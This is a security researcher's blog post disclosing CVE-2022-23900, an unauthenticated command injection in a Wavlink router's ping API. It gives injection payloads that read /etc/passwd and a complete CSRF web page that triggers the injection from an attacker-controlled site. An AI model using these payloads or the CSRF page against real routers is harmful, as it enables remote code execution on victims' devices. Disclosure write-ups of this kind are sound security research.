<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Wavlink Command Injection - CVE-2022-23900" /><meta name="author" content="Jack Maginnes (stigward)" /><meta property="og:locale" content="en" /><meta name="description" content="Wavlink Command Injection (CVE-2022–23900)" /><meta property="og:description" content="Wavlink Command Injection (CVE-2022–23900)" /><link rel="canonical" href="https://stigward.github.io/posts/wavlink-command-injection/" /><meta property="og:url" content="https://stigward.github.io/posts/wavlink-command-injection/" /><meta property="og:site_name" content="Stigward’s Security Journal" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-05T21:33:00-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Wavlink Command Injection - CVE-2022-23900" /><meta name="twitter:site" content="@_stigward" /><meta name="twitter:creator" content="@_stigward" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jack Maginnes (stigward)","url":"https://github.com/stigward/"},"dateModified":"2022-04-05T21:33:00-06:00","datePublished":"2022-04-05T21:33:00-06:00","description":"Wavlink Command Injection (CVE-2022–23900)","headline":"Wavlink Command Injection - CVE-2022-23900","mainEntityOfPage":{"@type":"WebPage","@id":"https://stigward.github.io/posts/wavlink-command-injection/"},"url":"https://stigward.github.io/posts/wavlink-command-injection/"}</script><title>Wavlink Command Injection - CVE-2022-23900 | Stigward's Security Journal</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/new_favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/new_favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/new_favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/new_favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/new_favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Stigward's Security Journal"><meta name="application-name" content="Stigward's Security Journal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/new_favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/profile.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Stigward's Security Journal</a></div><div class="site-subtitle font-italic">Bug Creator and Exploiter</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/stigward" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/_stigward" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['stigward.research','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Wavlink Command Injection - CVE-2022-23900</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Wavlink Command Injection - CVE-2022-23900</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1649215980" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 5, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/stigward/">Jack Maginnes (stigward)</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="771 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><h1 id="wavlink-command-injection-cve-202223900">Wavlink Command Injection (CVE-2022–23900)</h1><h2 id="tldr"><span class="mr-2">TL/DR:</span><a href="#tldr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The <a href="https://www.amazon.com/Wireless-Touchlink-Beamforming-High-Gain-Connections/dp/B07WNV36B2">Wavlink WL-WN531P3 router</a> exposes an API endpoint susceptible to command injection. This API endpoint is reachable without an authentication header, meaning the vulnerability can be exploited by an unauthenticated attacker. Furthermore, the router has no CSRF protection, thus RCE can be achieved without connecting to the local network.</p><h2 id="vulnerability-description-and-discovery"><span class="mr-2">Vulnerability Description and Discovery:</span><a href="#vulnerability-description-and-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The router hosts an API that is used to accept requests made from within the Admin portal. One thing a user can do from within this portal is send a <code class="language-plaintext highlighter-rouge">ping</code> command. An example has been included below:</p><p><img data-src="https://miro.medium.com/max/1400/1*r2YxDLi4t-Db4XZQ8z3Pyg.png" alt="" data-proofer-ignore></p><p>Because <code class="language-plaintext highlighter-rouge">ping</code> is a well-known bash command, we may immediately begin to theorize about the possibility of command injection.</p><h3 id="command-injection-explanation"><span class="mr-2">Command Injection Explanation:</span><a href="#command-injection-explanation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>For those unfamiliar with command injection, here is a quick rundown:</p><p>Let’s take the above <code class="language-plaintext highlighter-rouge">ping</code> functionality and walk through what could be happening between the web portal and the router.</p><ol><li>You as the user input the IP you wish to ping.<li>The Admin portal sends a request to the router with the IP you specified.<li>The router’s API endpoint handles the request with something like the following (yes this example has a BOF, it’s strictly an example):</ol><p>char command[50];<br /> strcpy(command, “ping “)<br /> strcat(command, user_specified_ip)<br /> system(command)</p><p>In the above code, we first add “ping “ to the <code class="language-plaintext highlighter-rouge">command</code> buffer. Then we add what is stored in <code class="language-plaintext highlighter-rouge">user_specified_ip</code> to our buffer, imagining this variable is storing the IP we specified in the Admin portal. Finally, we run <code class="language-plaintext highlighter-rouge">system(command)</code> which will execute our shell command (<code class="language-plaintext highlighter-rouge">ping &lt;ip&gt;</code>) on the underlying host operating system.</p><h3 id="abusing-the--system--command"><span class="mr-2">Abusing the <code class="language-plaintext highlighter-rouge">system</code> command:</span><a href="#abusing-the--system--command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>You can run two shell commands in one line if you delaminate them with a <code class="language-plaintext highlighter-rouge">;</code> . So if you open a command prompt and run <code class="language-plaintext highlighter-rouge">whoami; touch test.txt</code> , the command will first output the result <code class="language-plaintext highlighter-rouge">whoami</code> and then it will create the file <code class="language-plaintext highlighter-rouge">test.txt</code>. With this knowledge, we can exploit the <code class="language-plaintext highlighter-rouge">ping</code> example from above.</p><ol><li>Instead of inputting an IP in the admin panel, we input <code class="language-plaintext highlighter-rouge">; whoami</code>.<li>Now the command that gets run on the underlying OS is <code class="language-plaintext highlighter-rouge">ping ; whoami</code>.<li>The ping command fails as no argument is provided to it, and <code class="language-plaintext highlighter-rouge">whoami</code> subsequently executes, demonstrating an ability to run arbitrary commands on the box.</ol><h2 id="exploitation"><span class="mr-2">Exploitation:</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>So, spoiler alert but the explanation above is pretty much verbatim what is happening on the router. We can demonstrate this by providing the following input:</p><p><img data-src="https://miro.medium.com/proxy/1*hFDF_mkt0cCcd37fAGjnnQ.png" alt="" data-proofer-ignore></p><p>We can also prove that the filesystem is not just read-only by creating a new file.</p><p><img data-src="https://miro.medium.com/proxy/1*LTSwXi7yDe0JsFOxSDQW7A.png" alt="" data-proofer-ignore></p><p><img data-src="https://miro.medium.com/proxy/1*80gO-SzHr7KiC0qq-hk3Ww.png" alt="" data-proofer-ignore></p><p>Things get slightly more interesting though. Looking at the screenshot of a malicious request below, we note that the <code class="language-plaintext highlighter-rouge">pingIp</code> variable, which is sent in a POST to the <code class="language-plaintext highlighter-rouge">/cgi-bin/adm.cgi</code> endpoint, is what contains our payload. Here we are reading the contents of <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p><p><img data-src="https://miro.medium.com/proxy/1*FkzY1fRMKaikN7AmpbHMog.png" alt="" data-proofer-ignore></p><p>Because the user is logged in to the Admin portal, our malicious request includes a session cookie in the header (line 13 in the above screenshot). However, if we remove that header, the request is still successful, demonstrating this vulnerability is exploitable by an unauthenticated attacker.</p><p><img data-src="https://miro.medium.com/proxy/1*ZYKq-qBoVQAKMe75WzTqIQ.png" alt="" data-proofer-ignore></p><h3 id="chaining-with-a-csrf"><span class="mr-2">Chaining with a CSRF:</span><a href="#chaining-with-a-csrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The last step to weaponizing this exploit is adding the malicious request to an attacker-controlled website. The idea is as follows:</p><ol><li>An attacker from anywhere in the world creates a website that sends a malicious request to <code class="language-plaintext highlighter-rouge">192.168.10.1/cgi-bin/adm.cgi</code>.<li>The attacker sends the site to someone with the vulnerable Wavlink router.<li>The victim opens the site, and a malicious request is sent to the router on their local network.</ol><p>We can use the following fake website to achieve this result:</p><p><em>Note that I have our payload submitted on a button click, but we could have it take place on page load for less required user interaction.</em></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>  
    <span class="nt">&lt;body&gt;</span>  
        <span class="nt">&lt;h1&gt;</span>Totally Not Malicious Website<span class="nt">&lt;/h1&gt;</span>  
        <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://192.168.10.1/cgi-bin/adm.cgi"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>  
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"page"</span> <span class="na">value=</span><span class="s">"ping_test"</span> <span class="nt">/&gt;</span>  
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"CCMD"</span> <span class="na">value=</span><span class="s">"4"</span> <span class="nt">/&gt;</span>  
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"pingIp"</span> <span class="na">value=</span><span class="s">"; cat /etc/passwd"</span> <span class="nt">/&gt;</span>  
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"DONT CLICK"</span> <span class="nt">/&gt;</span>  
        <span class="nt">&lt;/form&gt;</span>  
    <span class="nt">&lt;/body&gt;</span>  
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>And with that, an unauthenticated RCE from outside the local network can be achieved on any Wavlink WL-WN531P3 router.</p><p><img data-src="https://miro.medium.com/proxy/1*CAF3uI-pod2D8rTRwnzK5g.png" alt="" data-proofer-ignore></p><p><img data-src="https://miro.medium.com/proxy/1*QpMHjRWuKUn6k3QJv_hXqg.png" alt="" data-proofer-ignore></p><h2 id="closing-thoughts"><span class="mr-2">Closing Thoughts:</span><a href="#closing-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is a meme of an issue, but it is my first official CVE so I’ll take it. It does emphasize that IoT devices still struggle with low-hanging vulnerabilities, so if you are looking for a way to get started in security research, this is a good area to get your hands dirty.</p><p>If you enjoyed this write-up, feel free to follow me on Twitter <a href="https://twitter.com/_stigward">@<em>stigward</em></a>, where I tweet things about security, programming, and current projects. Currently, I am working on some content related to IoT hacking and smart contract auditing</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vuln-research/'>Vuln Research</a>, <a href='/categories/iot/'>IoT</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/firmware/" class="post-tag no-text-decoration" >firmware</a> <a href="/tags/research/" class="post-tag no-text-decoration" >research</a> <a href="/tags/iot/" class="post-tag no-text-decoration" >iot</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Wavlink+Command+Injection+-+CVE-2022-23900+-+Stigward%27s+Security+Journal&url=https%3A%2F%2Fstigward.github.io%2Fposts%2Fwavlink-command-injection%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Wavlink+Command+Injection+-+CVE-2022-23900+-+Stigward%27s+Security+Journal&u=https%3A%2F%2Fstigward.github.io%2Fposts%2Fwavlink-command-injection%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstigward.github.io%2Fposts%2Fwavlink-command-injection%2F&text=Wavlink+Command+Injection+-+CVE-2022-23900+-+Stigward%27s+Security+Journal" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/fiio-m6-exploit/">Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</a><li><a href="/posts/fiio-m6-kernel-bug/">Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</a><li><a href="/posts/swordmaster-pwn-chal/">UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/fiio-m6-exploit/"><div class="card-body"> <em class="small" data-ts="1679974380" data-df="ll" > Mar 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</h3><div class="text-muted small"><p> Overview: A little over a month ago, I wrote a blog post detailing how I found a kernel vulnerability in the FiiO M6 Hi-Fi MP3 player. I would recommend reading that post first, but to recap: T...</p></div></div></a></div><div class="card"> <a href="/posts/fiio-m6-kernel-bug/"><div class="card-body"> <em class="small" data-ts="1676777580" data-df="ll" > Feb 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</h3><div class="text-muted small"><p> Overview: A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the dev...</p></div></div></a></div><div class="card"> <a href="/posts/swordmaster-pwn-chal/"><div class="card-body"> <em class="small" data-ts="1664163180" data-df="ll" > Sep 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</h3><div class="text-muted small"><p> Swordmaster Pwn Challenge Overview: This challenge was part of the ROMHack CTF hosted on HackTheBox’s CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadl...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/naughty-or-nice-web-chal/" class="btn btn-outline-primary" prompt="Older"><p>JWT Confusion and SSTI - CyberSanta CTF Naughty or Nice Web Challenge</p></a> <a href="/posts/swordmaster-pwn-chal/" class="btn btn-outline-primary" prompt="Newer"><p>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/_stigward">Stigward</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-QK87P1LVPH"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QK87P1LVPH'); }); </script>
